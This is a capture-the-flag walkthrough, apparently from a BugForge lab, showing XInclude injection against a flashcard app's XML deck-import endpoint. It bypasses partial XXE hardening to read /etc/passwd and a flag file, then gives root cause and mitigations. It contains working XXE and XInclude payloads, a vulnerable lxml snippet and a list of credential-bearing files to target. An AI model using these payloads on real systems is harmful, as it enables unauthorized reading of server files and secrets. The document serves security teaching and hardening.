---
title: "XInclude Injection to Arbitrary File Read | Tanuki"
date: 2026-05-12 11:45:00 +0530
categories: [Web Security, XXE]
tags: [xxe, xinclude, xml, arbitrary-file-read, file-disclosure, api-security, bugforge]
platform: BugForge
author: Shivansh Sharma
image:
  path: /assets/images/posts/tanuki-file-upload.webp
  alt: Tanuki XInclude arbitrary file read walkthrough
---

# Tanuki

Tanuki is a flashcard application that allows users to import custom decks through an XML-based API endpoint. During testing, the XML parser appeared resistant to traditional XXE payloads, but further analysis revealed support for XInclude processing.

By abusing XInclude functionality, it became possible to read arbitrary local files from the server and eventually disclose the flag directly through the application UI.

---

# Overview

While browsing application functionality, an interesting API endpoint was discovered:

```http
/api/decks/import
```

The endpoint accepted uploaded deck files and processed XML content server-side.

This immediately suggested potential attack surfaces involving:

- XML External Entity Injection (XXE)
- XInclude Injection
- Arbitrary File Read
- XML Parser Misconfigurations

---

# Objective

- Analyze the XML import functionality
- Identify parser behavior
- Test for XXE vulnerabilities
- Bypass parser restrictions
- Read local files from the server
- Retrieve the flag through XML injection

---

# Initial XML Structure

A sample deck was downloaded from the application and converted into XML format.

## Sample XML

```xml
<?xml version="1.0" encoding="UTF-8"?>
<deck>
    <name>Sample Deck</name>
    <description>
        A sample deck showing the import format for custom flashcards
    </description>
    <category>Example</category>

    <cards>
        <card>
            <front>How do you create a custom deck?</front>
            <back>
                Download this sample file, edit the name, description, category,
                and cards array with your own content, then upload it using the
                Import Deck feature.
            </back>
        </card>
    </cards>
</deck>
```

The application clearly parsed XML server-side, making XXE testing worthwhile.

---

# Attempting Traditional XXE

A classic XXE payload was injected using a `DOCTYPE` declaration.

## Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE deck [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

<deck>
    <name>&xxe;</name>

    <description>
        A sample deck showing the import format for custom flashcards
    </description>

    <category>Example</category>

    <cards>
        <card>
            <front>How do you create a custom deck?</front>

            <back>
                Download this sample file, edit the name, description, category,
                and cards array with your own content, then upload it using the
                Import Deck feature.
            </back>
        </card>
    </cards>
</deck>
```

---

# Parser Response

The application rejected the payload and returned:

```json
{"error":"Invalid file format or content"}
```

This suggested:

- External entities may have been blocked
- `DOCTYPE` declarations may have been filtered
- The parser likely used partial hardening

At this point, the target appeared resistant to standard XXE attacks.

---

# Discovering Parser Behavior

After additional testing, it became clear the application accepted XML files that used namespaces.

A valid upload looked like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<deck xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <name>test</name>
    <description>test</description>
    <category>test</category>

    <cards>
        <card>
            <front>test</front>
            <back>test</back>
        </card>
    </cards>
</deck>
```

This hinted that the XML parser may still support advanced XML features such as XInclude.

---

# Exploiting XInclude

Instead of relying on external entities, XInclude was used to include local files directly into XML nodes.

## XInclude Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>

<deck xmlns:xi="http://www.w3.org/2001/XInclude">
    <name>
        <xi:include href="file:///etc/passwd" parse="text"/>
    </name>

    <description>test</description>
    <category>test</category>

    <cards>
        <card>
            <front>test</front>
            <back>test</back>
        </card>
    </cards>
</deck>
```

---

# Arbitrary File Read

After importing the malicious deck and refreshing the UI, the contents of `/etc/passwd` were rendered inside the imported deck name.

This confirmed:

- XInclude processing was enabled
- Arbitrary local file reads were possible
- XML parser hardening was incomplete

---

# Retrieving the Flag

Once arbitrary file access was confirmed, the next step was locating the flag.

The flag was discovered using:

```xml
<xi:include href="file://flag.txt" parse="text"/>
```

After refreshing the application UI, the imported deck name rendered the contents of the flag file.

## Result

```text
bug{.....}
```

---

# Why Traditional XXE Failed but XInclude Worked

This is a common XML security mistake.

Many developers disable:

- `DOCTYPE`
- External entities
- Entity expansion

but forget to disable:

- XInclude processing

As a result:

- Classic XXE payloads fail
- XInclude payloads still succeed

This creates a dangerous false sense of security.

---

# Root Cause Analysis

The vulnerability existed because the XML parser processed untrusted XML input with XInclude support enabled.

A vulnerable backend parser configuration may resemble:

```python
parser = etree.XMLParser()
tree = etree.parse(xml_file, parser)
tree.xinclude()
```

If user-controlled XML is processed this way, attackers can include arbitrary local files.

---

# Impact

Successful XInclude injection can lead to:

- Arbitrary local file disclosure
- Credential leakage
- Source code disclosure
- Configuration exposure
- Secret/key extraction
- Potential SSRF in some parsers

Common targets include:

```text
/etc/passwd
/etc/hosts
/proc/self/environ
/application/config/*
.env
```

---

# Mitigation

## Disable XInclude Processing

Do not process XInclude directives for untrusted XML.

---

## Use Secure XML Parsers

Configure parsers with secure defaults.

### Python (lxml)

```python
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True
)
```

Avoid calling:

```python
tree.xinclude()
```

---

## Validate XML Strictly

Reject unexpected namespaces and unsupported XML features.

---

## Prefer Safer Formats

Use JSON instead of XML when advanced XML functionality is unnecessary.

---

# Real-World Insight

XInclude vulnerabilities are frequently overlooked because many security checks focus only on traditional XXE payloads.

Applications often block:

```xml
<!DOCTYPE>
```

while still permitting:

```xml
<xi:include>
```

This leads to situations where scanners report the application as "safe from XXE" even though arbitrary file inclusion is still possible through alternate XML mechanisms.

Modern XML security requires disabling:

- External entities
- DTD processing
- XInclude
- Network fetching

not just one of them.

---

# Key Takeaways

- Blocking `DOCTYPE` alone is not enough
- XInclude can bypass partial XXE protections
- XML namespaces can expose hidden parser functionality
- Arbitrary file read vulnerabilities often survive incomplete hardening
- XML parsers should be configured securely by default

